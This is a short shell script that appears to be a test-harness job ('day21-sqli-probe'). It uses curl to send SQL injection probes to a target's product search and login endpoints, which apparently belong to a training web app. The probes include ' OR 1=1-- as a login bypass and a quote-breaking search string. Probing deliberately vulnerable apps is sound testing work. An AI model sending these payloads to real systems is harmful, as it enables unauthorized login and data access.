#!/bin/sh
# Mounted into day21-sqli-probe Job. Env: BASE, SCENARIO, SCENARIO_ID, RUN_ID
set -eu

ah() {
  curl -sS -o /tmp/body -w "%{http_code}" \
    -H "X-Athena-Scenario: ${SCENARIO}" \
    -H "X-Athena-Scenario-Id: ${SCENARIO_ID}" \
    -H "X-Athena-Run-ID: ${RUN_ID}" \
    -H "User-Agent: athena-agents/day21-sqli-probe" \
    "$@" || true
}

echo "BASE=${BASE}"
echo "GET /"
echo "root:$(ah "${BASE}/")"
echo "GET search OR 1=1"
echo "search:$(ah --get --data-urlencode "q=' OR 1=1--" "${BASE}/rest/products/search")"
echo "POST login SQLi"
echo "login:$(ah -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}" \
  "${BASE}/rest/user/login")"
echo "GET search qwert')"
echo "qwert:$(ah "${BASE}/rest/products/search?q=qwert%27)")"
sleep 2
echo done
